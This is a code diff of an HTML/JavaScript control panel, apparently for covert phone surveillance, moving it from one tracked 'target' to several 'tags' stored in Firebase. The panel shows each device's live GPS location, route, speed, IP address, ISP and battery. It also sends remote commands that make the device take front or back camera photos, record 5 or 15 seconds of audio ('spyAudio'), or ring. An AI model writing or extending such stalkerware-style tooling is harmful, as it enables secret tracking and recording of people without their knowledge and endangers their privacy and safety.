-        geofenceOn = !geofenceOn;
-        const btn = document.getElementById('geoBtn');
-        if (geofenceOn) {
-            if (lastLat === 0) {
-                geofenceOn = false;
-                toast('⚠️ আগে GPS data আসতে দিন!', 'error');
+            if (!data.isOnline) {
+                document.getElementById('statusDot').className = 'status-dot offline';
+                document.getElementById('statusText').className = 'status-text offline';
+                document.getElementById('statusText').textContent = 'Offline';
+                document.getElementById('lastSeenTime').textContent = data.lastSeen ? timeAgo(data.lastSeen) : '';
+                document.getElementById('mapHud').style.display = 'none';
                 return;
             }
-            geofenceCenter = [lastLat, lastLng];
-            geofenceCircle = L.circle(geofenceCenter, {
-                radius: 200, color: '#f59e0b', fillColor: '#f59e0b',
-                fillOpacity: 0.07, weight: 2, dashArray: '8,5'
-            }).addTo(map);
-            btn.textContent = '🛡 Geofence: ON (200m)';
-            btn.classList.add('on');
-            geoAlertShown = false;
-            toast('🛡 Geofence চালু — ২০০মিটার radius', 'success');
-        } else {
-            if (geofenceCircle) { map.removeLayer(geofenceCircle); geofenceCircle = null; }
-            btn.textContent = '🛡 Geofence: OFF';
-            btn.classList.remove('on');
-            toast('Geofence বন্ধ।', 'info');
-        }
-    });
 
-    // ─── Photo Listener ───────────────────────────────────────────
-    onValue(ref(db, 'live_location/photo'), (snap) => {
-        const d = snap.val();
-        if (!d) return;
-        document.getElementById('photoBox').classList.add('visible');
-        if (d.image) {
-            document.getElementById('photoBadge').textContent = '✓ Got it!';
-            document.getElementById('photoBadge').className = 'media-badge badge-ok';
-            const img = document.getElementById('spyImg');
-            img.src = d.image; img.className = 'spy-img show';
-            document.getElementById('downloadPhoto').href = d.image;
-            document.getElementById('photoActions').style.display = 'flex';
-            toast('📸 Photo পাওয়া গেছে!', 'success');
-        } else if (d.error) {
-            document.getElementById('photoBadge').textContent = '✗ Error';
-            document.getElementById('photoBadge').className = 'media-badge badge-err';
-            toast(`⚠️ ${d.error}`, 'error', 5000);
-        }
-    });
+            document.getElementById('statusDot').className = 'status-dot live';
+            document.getElementById('statusText').className = 'status-text live';
+            document.getElementById('statusText').textContent = 'Live ●';
+            document.getElementById('mapHud').style.display = 'flex';
+            document.getElementById('tagIdUI').textContent = `Tag #${tagId.replace('tag', '')}`;
 
-    // ─── Audio Listener ───────────────────────────────────────────
-    onValue(ref(db, 'live_location/audio'), (snap) => {
-        const d = snap.val();
-        if (!d) return;
-        document.getElementById('audioBox').classList.add('visible');
-        if (d.file) {
-            document.getElementById('audioBadge').textContent = '✓ Received!';
-            document.getElementById('audioBadge').className = 'media-badge badge-ok';
-            const audio = document.getElementById('spyAudio');
-            audio.src = d.file; audio.className = 'spy-audio show';
-            document.getElementById('downloadAudio').href = d.file;
-            document.getElementById('audioActions').style.display = 'flex';
-            toast('🎙 Voice recording পাওয়া গেছে!', 'success');
-        } else if (d.error) {
-            document.getElementById('audioBadge').textContent = '✗ Error';
-            document.getElementById('audioBadge').className = 'media-badge badge-err';
-            toast(`⚠️ ${d.error}`, 'error', 5000);
-        }
-    });
+            if (data.lastSeen) {
+                clearInterval(lastSeenTimer);
+                const updateTS = () => document.getElementById('lastSeenTime').textContent = timeAgo(data.lastSeen);
+                updateTS();
+                lastSeenTimer = setInterval(updateTS, 5000);
+            }
 
-    // ─── Main Location Listener ───────────────────────────────────
-    onValue(ref(db, 'live_location/target_user'), (snap) => {
-        const data = snap.val();
+            document.getElementById('deviceUI').textContent = data.deviceInfo || '--';
+            const batText = data.battery != null ? `${data.battery}% ${data.charging ? '⚡ Charging' : '🔋'}` : '--';
+            document.getElementById('batUI').textContent = batText;
+            document.getElementById('hudBat').textContent = data.battery ? `${data.battery}%` : '--';
 
-        if (!data || !data.isOnline) {
-            document.getElementById('statusDot').className = 'status-dot offline';
-            document.getElementById('statusText').className = 'status-text offline';
-            document.getElementById('statusText').textContent = 'Offline';
-            document.getElementById('mapHud').style.display = 'none';
-            return;
+            const ip = data.ip_address || '--';
+            const isp = data.isp || '--';
+            document.getElementById('ipUI').textContent = ip;
+            document.getElementById('ispUI').textContent = isp;
+            document.getElementById('hudIp').textContent = ip;
+
+            if (data.status && (data.status.includes('Error') || data.status.includes('Denied') || data.status.includes('Lost'))) {
+                document.getElementById('addressUI').textContent = `⚠️ ${data.status}`;
+                document.getElementById('addressBox').className = 'address-box error';
+                return;
+            }
+
+            const { latitude: lat, longitude: lng, accuracy, speed, heading } = data;
+            if (!lat || !lng) return;
+
+            document.getElementById('latUI').textContent = lat.toFixed(6);
+            document.getElementById('lngUI').textContent = lng.toFixed(6);
+            document.getElementById('accUI').textContent = accuracy ? `±${Math.round(accuracy)}m` : '--';
+            document.getElementById('speedUI').textContent = speed || 0;
+            document.getElementById('headingUI').textContent = `${Math.round(heading || 0)}°`;
+            document.getElementById('speedFill').style.width = `${Math.min((speed / 120) * 100, 100)}%`;
+            document.getElementById('hudSpeed').textContent = `${speed || 0} km/h`;
+            document.getElementById('mapsLink').href = `https://maps.google.com/?q=${lat},${lng}`;
+
+            if (Math.abs(lat - lastLat) > 0.00010 || lastLat === 0) fetchAddress(lat, lng);
+            lastLat = lat; lastLng = lng;
+
+            // Pan map to active tag
+            map.panTo([lat, lng]);
         }
 
-        // ── Online ──
-        document.getElementById('statusDot').className = 'status-dot live';
-        document.getElementById('statusText').className = 'status-text live';
-        document.getElementById('statusText').textContent = 'Live ●';
-        document.getElementById('mapHud').style.display = 'flex';
+        // ─── Update Marker on Map ─────────────────────────────────────
+        function updateMarker(tagId, data) {
+            if (!data.latitude || !data.longitude) return;
+            const lat = data.latitude, lng = data.longitude;
+            const tagNum = tagId.replace('tag', '');
+            const colorIdx = (parseInt(tagNum) - 1) % TAG_COLORS.length;
+            const color = TAG_COLORS[colorIdx];
+            const speed = data.speed || 0;
+            const heading = data.heading || 0;
+            const emoji = speed > 50 ? '🚗' : speed > 10 ? '🛵' : speed > 2 ? '🚶' : '🧍';
+            const active = tagId === activeTagId;
 
-        // Last seen timer
-        if (data.lastSeen) {
-            clearInterval(lastSeenTimer);
-            const updateTS = () => document.getElementById('lastSeenTime').textContent = timeAgo(data.lastSeen);
-            updateTS();
-            lastSeenTimer = setInterval(updateTS, 5000);
-        }
+            const iconHtml = `
+            <div style="position:relative;text-align:center;">
+                <div style="transform:rotate(${heading}deg);font-size:${active ? 32 : 22}px;filter:drop-shadow(0 2px 8px rgba(0,0,0,0.7));">${emoji}</div>
+                <div style="background:${color};color:#fff;border-radius:6px;font-size:9px;font-weight:700;padding:1px 4px;margin-top:2px;font-family:monospace;">#${tagNum}</div>
+            </div>`;
+            const icon = L.divIcon({ className: '', html: iconHtml, iconSize: [40, 50], iconAnchor: [20, 25] });
+            const latlng = [lat, lng];
 
-        // Device Info
-        document.getElementById('deviceUI').textContent = data.deviceInfo || '--';
-        const batText = data.battery != null
-            ? `${data.battery}% ${data.charging ? '⚡ Charging' : '🔋'}` : '--';
-        document.getElementById('batUI').textContent = batText;
-        document.getElementById('hudBat').textContent = data.battery ? `${data.battery}%` : '--';
+            if (!markers[tagId]) {
+                accuracyCircles[tagId] = L.circle(latlng, {
+                    radius: data.accuracy || 50, color, fillColor: color,
+                    fillOpacity: 0.08, weight: 1
+                }).addTo(map);
+                routeLines[tagId] = L.polyline([], { color, weight: 2.5, opacity: 0.8, dashArray: '5,4' }).addTo(map);
+                markers[tagId] = L.marker(latlng, { icon }).addTo(map);
+                markers[tagId].bindTooltip(`Tag #${tagNum} — ${data.deviceInfo || ''}`, { permanent: false, direction: 'top' });
+                if (active) map.flyTo(latlng, 17, { duration: 2.5 });
+            } else {
+                markers[tagId].setLatLng(latlng).setIcon(icon);
+                if (accuracyCircles[tagId]) accuracyCircles[tagId].setLatLng(latlng).setRadius(data.accuracy || 50);
+            }
 
-        // IP & ISP — clean display
-        const ip = data.ip_address || '--';
-        const isp = data.isp || '--';
-        document.getElementById('ipUI').textContent = ip;
-        document.getElementById('ispUI').textContent = isp;
-        document.getElementById('hudIp').textContent = ip;
+            routeLines[tagId].addLatLng(latlng);
+            if (!routePoints[tagId]) routePoints[tagId] = 0;
+            routePoints[tagId]++;
+            if (active) document.getElementById('pointsUI').textContent = routePoints[tagId];
 
-        // GPS Error check
-        if (data.status && (data.status.includes('Error') || data.status.includes('Denied') || data.status.includes('Lost'))) {
-            const box = document.getElementById('addressBox');
-            box.querySelector('#addressUI').textContent = `⚠️ ${data.status}`;
-            box.className = 'address-box error';
-            return;
-        }
-
-        const { latitude: lat, longitude: lng, accuracy, speed, heading } = data;
-        if (!lat || !lng) return;
-
-        // Coords
-        document.getElementById('latUI').textContent = lat.toFixed(6);
-        document.getElementById('lngUI').textContent = lng.toFixed(6);
-        document.getElementById('accUI').textContent = accuracy ? `±${Math.round(accuracy)}m` : '--';
-        document.getElementById('speedUI').textContent = speed || 0;
-        document.getElementById('headingUI').textContent = `${Math.round(heading || 0)}°`;
-        document.getElementById('speedFill').style.width = `${Math.min((speed / 120) * 100, 100)}%`;
-        document.getElementById('hudSpeed').textContent = `${speed || 0} km/h`;
-        document.getElementById('mapsLink').href = `https://maps.google.com/?q=${lat},${lng}`;
-
-        // Address fetch when moved
-        if (Math.abs(lat - lastLat) > 0.00010 || lastLat === 0) {
-            fetchAddress(lat, lng);
-        }
-        lastLat = lat; lastLng = lng;
-
-        // Route line
-        routeLine.addLatLng([lat, lng]);
-        routePoints++;
-        document.getElementById('pointsUI').textContent = routePoints;
-
-        // Marker icon
-        const emoji = speed > 50 ? '🚗' : speed > 10 ? '🛵' : speed > 2 ? '🚶' : '🧍';
-        const iconHtml = `<div class="smart-marker" style="transform:rotate(${heading||0}deg)">${emoji}</div>`;
-        const icon = L.divIcon({ className: '', html: iconHtml, iconSize: [40,40], iconAnchor: [20,20] });
-        const latlng = [lat, lng];
-
-        if (!marker) {
-            accuracyCircle = L.circle(latlng, {
-                radius: accuracy || 50, color: '#38bdf8', fillColor: '#38bdf8',
-                fillOpacity: 0.1, weight: 1
-            }).addTo(map);
-            marker = L.marker(latlng, { icon }).addTo(map);
-            map.flyTo(latlng, 17, { duration: 2.5 });
-        } else {
-            marker.setLatLng(latlng).setIcon(icon);
-            if (accuracyCircle) accuracyCircle.setLatLng(latlng).setRadius(accuracy || 50);
-        }
-
-        // Geofence check
-        if (geofenceOn && geofenceCenter && !geoAlertShown) {
-            const dist = map.distance(latlng, geofenceCenter);
-            if (dist > 200) {
-                geoAlertShown = true;
-                document.getElementById('geoAlert').style.display = 'block';
-                document.getElementById('geoAlertMsg').textContent =
-                    `Target is ${Math.round(dist)}m from the safe zone boundary!`;
-                // Also send ring alarm
-                set(ref(db, 'live_location/command'), { ringTime: Date.now() });
+            // Geofence check
+            if (active && geofenceOn && geofenceCenter && !geoAlertShown) {
+                const dist = map.distance(latlng, geofenceCenter);
+                if (dist > 200) {
+                    geoAlertShown = true;
+                    document.getElementById('geoAlert').style.display = 'block';
+                    document.getElementById('geoAlertMsg').textContent = `Tag #${tagNum} is ${Math.round(dist)}m from safe zone!`;
+                    set(ref(db, `live_location/users/${tagId}/command`), { ringTime: Date.now() });
+                }
             }
         }
-    });
-</script>
+
+        // ─── User Tab Management ──────────────────────────────────────
+        function renderUserTabs(usersData) {
+            const tabsEl = document.getElementById('userTabs');
+            tabsEl.innerHTML = '';
+
+            const tagIds = Object.keys(usersData || {}).sort((a, b) => {
+                return parseInt(a.replace('tag', '')) - parseInt(b.replace('tag', ''));
+            });
+
+            let onlineCount = 0;
+            tagIds.forEach(tagId => {
+                const data = usersData[tagId];
+                const isOnline = data && data.isOnline;
+                if (isOnline) onlineCount++;
+
+                const tagNum = tagId.replace('tag', '');
+                const tab = document.createElement('div');
+                tab.className = `user-tab${tagId === activeTagId ? ' active' : ''}`;
+                tab.id = `tab-${tagId}`;
+                tab.innerHTML = `
+                <div class="tab-dot ${isOnline ? 'live' : 'offline'}"></div>
+                <span class="tab-serial">#${tagNum}</span>
+                <span>${data?.deviceInfo ? data.deviceInfo.split('(')[0].trim().substring(0, 10) : 'Unknown'}</span>
+            `;
+                tab.addEventListener('click', () => selectTag(tagId));
+                tabsEl.appendChild(tab);
+            });
+
+            document.getElementById('onlineCount').textContent = `${onlineCount} Online`;
+
+            // Auto-select first online tag if none selected
+            if (!activeTagId && tagIds.length > 0) {
+                const firstOnline = tagIds.find(t => usersData[t]?.isOnline) || tagIds[0];
+                selectTag(firstOnline);
+            }
+        }
+
+        function selectTag(tagId) {
+            activeTagId = tagId;
+
+            // Update tabs UI
+            document.querySelectorAll('.user-tab').forEach(t => t.classList.remove('active'));
+            const tabEl = document.getElementById(`tab-${tagId}`);
+            if (tabEl) tabEl.classList.add('active');
+
+            // Reset media boxes
+            document.getElementById('photoBox').classList.remove('visible');
+            document.getElementById('audioBox').classList.remove('visible');
+            document.getElementById('spyImg').className = 'spy-img';
+            document.getElementById('spyAudio').className = 'spy-audio';
+
+            // Render panel
+            if (currentData[tagId]) renderPanelForTag(tagId);
+
+            toast(`🎯 Tag #${tagId.replace('tag', '')} selected`, 'info');
+        }
+
+        // ─── Main Firebase Listener (all users) ──────────────────────
+        onValue(ref(db, 'live_location/users'), (snap) => {
+            const usersData = snap.val() || {};
+            currentData = usersData;
+
+            renderUserTabs(usersData);
+
+            // Update all markers
+            Object.entries(usersData).forEach(([tagId, data]) => {
+                if (data && data.isOnline && data.latitude && data.longitude) {
+                    updateMarker(tagId, data);
+                }
+            });
+
+            // Update panel for active tag
+            if (activeTagId && usersData[activeTagId]) {
+                renderPanelForTag(activeTagId);
+            }
+        });
+
+        // ─── Media Listeners (active tag) ────────────────────────────
+        let mediaUnsub = {};
+
+        function listenMedia(tagId) {
+            // Old listeners auto-update with onValue — Firebase handles this
+            // We just re-bind the delete/download to the active tag
+        }
+
+        // Photo listener — listens to active tag's photo
+        onValue(ref(db, 'live_location/users'), (snap) => {
+            if (!activeTagId) return;
+            const data = snap.val()?.[activeTagId];
+            if (!data?.photo) return;
+            const d = data.photo;
+            document.getElementById('photoBox').classList.add('visible');
+            if (d.image) {
+                document.getElementById('photoBadge').textContent = '✓ Got it!';
+                document.getElementById('photoBadge').className = 'media-badge badge-ok';
+                const img = document.getElementById('spyImg');
+                img.src = d.image; img.className = 'spy-img show';
+                document.getElementById('downloadPhoto').href = d.image;
+                document.getElementById('photoActions').style.display = 'flex';
+            } else if (d.error) {
+                document.getElementById('photoBadge').textContent = '✗ Error';
+                document.getElementById('photoBadge').className = 'media-badge badge-err';
+            }
+        });
+
+        // Audio listener
+        onValue(ref(db, 'live_location/users'), (snap) => {
+            if (!activeTagId) return;
+            const data = snap.val()?.[activeTagId];
+            if (!data?.audio) return;
+            const d = data.audio;
+            document.getElementById('audioBox').classList.add('visible');
+            if (d.file) {
+                document.getElementById('audioBadge').textContent = '✓ Received!';
+                document.getElementById('audioBadge').className = 'media-badge badge-ok';
+                const audio = document.getElementById('spyAudio');
+                audio.src = d.file; audio.className = 'spy-audio show';
+                document.getElementById('downloadAudio').href = d.file;
+                document.getElementById('audioActions').style.display = 'flex';
+            } else if (d.error) {
+                document.getElementById('audioBadge').textContent = '✗ Error';
+                document.getElementById('audioBadge').className = 'media-badge badge-err';
+            }
+        });
+
+        // ─── Ring Button ──────────────────────────────────────────────
+        document.getElementById('ringBtn').addEventListener('click', () => {
+            if (!activeTagId) { toast('⚠️ একটি target select করুন!', 'error'); return; }
+            set(ref(db, `live_location/users/${activeTagId}/command`), { ringTime: Date.now() });
+            toast('🔔 Ring পাঠানো হয়েছে!', 'success');
+        });
+
+        // ─── Photo Buttons ────────────────────────────────────────────
+        function requestPhoto(camType) {
+            if (!activeTagId) { toast('⚠️ একটি target select করুন!', 'error'); return; }
+            set(ref(db, `live_location/users/${activeTagId}/command`), { photoTime: Date.now(), camType });
+            document.getElementById('photoBox').classList.add('visible');
+            document.getElementById('photoBadge').textContent = 'Requesting...';
+            document.getElementById('photoBadge').className = 'media-badge badge-wait';
+            document.getElementById('spyImg').className = 'spy-img';
+            document.getElementById('photoActions').style.display = 'none';
+            toast(`📸 ${camType === 'user' ? 'Front' : 'Back'} camera request পাঠানো হয়েছে...`, 'info');
+        }
+        document.getElementById('photoFrontBtn').addEventListener('click', () => requestPhoto('user'));
+        document.getElementById('photoBackBtn').addEventListener('click', () => requestPhoto('environment'));
+
+        // ─── Audio Buttons ────────────────────────────────────────────
+        function requestAudio(duration = 5000) {
+            if (!activeTagId) { toast('⚠️ একটি target select করুন!', 'error'); return; }
+            set(ref(db, `live_location/users/${activeTagId}/command`), { audioTime: Date.now(), audioDuration: duration });
+            document.getElementById('audioBox').classList.add('visible');
+            document.getElementById('audioBadge').textContent = `Recording ${duration / 1000}s...`;
+            document.getElementById('audioBadge').className = 'media-badge badge-wait';
+            document.getElementById('spyAudio').className = 'spy-audio';
+            document.getElementById('audioActions').style.display = 'none';
+            toast(`🎙 ${duration / 1000}s recording request পাঠানো হয়েছে!`, 'info');
+        }
+        document.getElementById('audioBtn').addEventListener('click', () => requestAudio(5000));
+        document.getElementById('audioLongBtn').addEventListener('click', () => requestAudio(15000));
+
+        // ─── Delete Buttons ───────────────────────────────────────────
+        document.getElementById('deletePhoto').addEventListener('click', () => {
+            if (!activeTagId) return;
+            showConfirm('Photo Firebase থেকে মুছে ফেলবো?', () => {
+                remove(ref(db, `live_location/users/${activeTagId}/photo`));
+                document.getElementById('photoBox').classList.remove('visible');
+                toast('🗑 Photo মুছা হয়েছে।', 'success');
+            });
+        });
+        document.getElementById('deleteAudio').addEventListener('click', () => {
+            if (!activeTagId) return;
+            showConfirm('Audio Firebase থেকে মুছে ফেলবো?', () => {
+                remove(ref(db, `live_location/users/${activeTagId}/audio`));
+                document.getElementById('audioBox').classList.remove('visible');
+                toast('🗑 Audio মুছা হয়েছে।', 'success');
+            });
+        });
+
+        // ─── Clear Route ──────────────────────────────────────────────
+        document.getElementById('clearRouteBtn').addEventListener('click', () => {
+            showConfirm('Route history মুছে ফেলবো?', () => {
+                if (activeTagId && routeLines[activeTagId]) routeLines[activeTagId].setLatLngs([]);
+                if (activeTagId) routePoints[activeTagId] = 0;
+                lastLat = 0; lastLng = 0;
+                document.getElementById('pointsUI').textContent = '0';
+                document.getElementById('routeLog').innerHTML = '<div style="font-size:11px;color:var(--muted);text-align:center;padding:8px 0;">No route data yet</div>';
+                toast('Route cleared.', 'info');
+            });
+        });
+
+        // ─── Geofence Button ─────────────────────────────────────────
+        document.getElementById('geoBtn').addEventListener('click', () => {
+            geofenceOn = !geofenceOn;
+            const btn = document.getElementById('geoBtn');
+            if (geofenceOn) {
+                if (!activeTagId || !currentData[activeTagId]?.latitude) {
+                    geofenceOn = false;
+                    toast('⚠️ আগে GPS data আসতে দিন!', 'error');
+                    return;
+                }
+                const d = currentData[activeTagId];
+                geofenceCenter = [d.latitude, d.longitude];
+                geofenceCircle = L.circle(geofenceCenter, {
+                    radius: 200, color: '#f59e0b', fillColor: '#f59e0b',
+                    fillOpacity: 0.07, weight: 2, dashArray: '8,5'
+                }).addTo(map);
+                btn.textContent = '🛡 Geofence: ON (200m)';
+                btn.classList.add('on');
+                geoAlertShown = false;
+                toast('🛡 Geofence চালু — ২০০মিটার radius', 'success');
+            } else {
+                if (geofenceCircle) { map.removeLayer(geofenceCircle); geofenceCircle = null; }
+                btn.textContent = '🛡 Geofence: OFF';
+                btn.classList.remove('on');
+                toast('Geofence বন্ধ।', 'info');
+            }
+        });
+    </script>
 </body>
+
 </html>
